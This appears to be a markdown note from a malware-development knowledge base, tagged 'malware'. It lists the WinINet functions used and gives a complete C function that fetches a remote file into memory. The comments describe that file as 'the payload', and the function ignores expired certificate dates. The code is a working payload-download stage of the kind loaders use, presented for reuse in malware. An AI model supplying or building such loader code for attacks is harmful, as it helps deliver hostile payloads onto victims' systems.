---
tags:
  - malware
---
# Pattern
- [[InternetOpenW]]
- [[InternetOpenUrlW]]
- [[InternetReadFile]]
- [[InternetCloseHandle]]
- [[InternetSetOptionW]]
# Code
1. Open internet session with [[InternetOpenW]]
2. Open the url with [[InternetOpenUrlW]]
3. Read the file with [[InternetReadFile]]
4. Close the handle with [[InternetCloseHandle]]
5. Close the HTTPS session with [[InternetSetOptionW]]
```c
BOOL FetchFileFromURL(IN LPCWSTR szFileDownloadUrl, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize)
{
	HINTERNET	hInternet			= NULL,
				hInternetFile		= NULL;
 
	PBYTE 		pTmpPntr			= NULL,
				pFileBuffer			= NULL;
	DWORD		dwTmpBytesRead		= 0x00,
				dwFileSize			= 0x00;
 
	if (!ppFileBuffer || !pdwFileSize)
		return FALSE;
 
	// Opening the internet session handle, all arguments are NULL here since no proxy options are required
	if (!(hInternet = InternetOpenW(NULL, 0x00, NULL, NULL, 0x00))) {
		printf("[!] InternetOpenW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}
 
	// Opening the handle to the payload using the payload's URL
	if (!(hInternetFile = InternetOpenUrlW(hInternet, szFileDownloadUrl, NULL, 0x00, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0x00))) {
		printf("[!] InternetOpenUrlW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}
 
	// Allocating 1024 bytes to the temp buffer
	if (!(pTmpPntr = LocalAlloc(LPTR, 1024))) {
		printf("[!] LocalAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}
 
	while (TRUE) 
	{
		// Reading 1024 bytes to the tmp buffer.
		// The function will read less bytes in case the file is less than 1024 bytes.
		if (!InternetReadFile(hInternetFile, pTmpPntr, 1024, &dwTmpBytesRead)) {
			printf("[!] InternetReadFile Failed With Error: %d \n", GetLastError());
			goto _END_OF_FUNC;
		}
 
		// Add to the total size of the total buffer
		dwFileSize += dwTmpBytesRead;
 
		if (!pFileBuffer)
		{
			// In case the total buffer is not allocated yet
			// then allocate it equal to the size of the bytes read since it may be less than 1024 bytes
			pFileBuffer = LocalAlloc(LPTR, dwTmpBytesRead);
		}
		else
		{
			// Otherwise, reallocate the pFileBuffer buffer to equal to the total size, dwFileSize.
			// This is required in order to fit the whole payload
			pFileBuffer = LocalReAlloc(pFileBuffer, dwFileSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
		}
		
		if (!pFileBuffer) 
		{
			printf("[!] LocalAlloc/LocalReAlloc [%d] Failed With Error: %ld \n", __LINE__, GetLastError());
			goto _END_OF_FUNC;
		}
 
		// Append the temp buffer to the end of the total buffer
		memcpy(pFileBuffer + (dwFileSize - dwTmpBytesRead), pTmpPntr, dwTmpBytesRead);
		// Clean up the temp buffer
		memset(pTmpPntr, 0x00, dwTmpBytesRead);
 
		// If less than 1024 bytes were read it means the end of the file was reached.
		// Therefore we exit the loop
		if (dwTmpBytesRead < 1024)
			break;
 
		// Otherwise, read the next 1024 bytes
	}
 
	// Populate the output parameters
	*ppFileBuffer = pFileBuffer;
	*pdwFileSize = dwFileSize;
 
_END_OF_FUNC:
	if (pTmpPntr)														// Release the temp buffer
		LocalFree(pTmpPntr);
	if ((!*ppFileBuffer || !*pdwFileSize) && pFileBuffer)				// If function failed, free the total file buffer if ever allocated
		LocalFree(pFileBuffer);
	if (hInternetFile)													// Close handle
		InternetCloseHandle(hInternetFile);								
	if (hInternet)														// Close handle
		InternetCloseHandle(hInternet);
	if (hInternet)														// Closing Wininet connection
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	// Return TRUE if output parameters are populated
	return (*ppFileBuffer != NULL && *pdwFileSize != 0x00) ? TRUE : FALSE;
}
```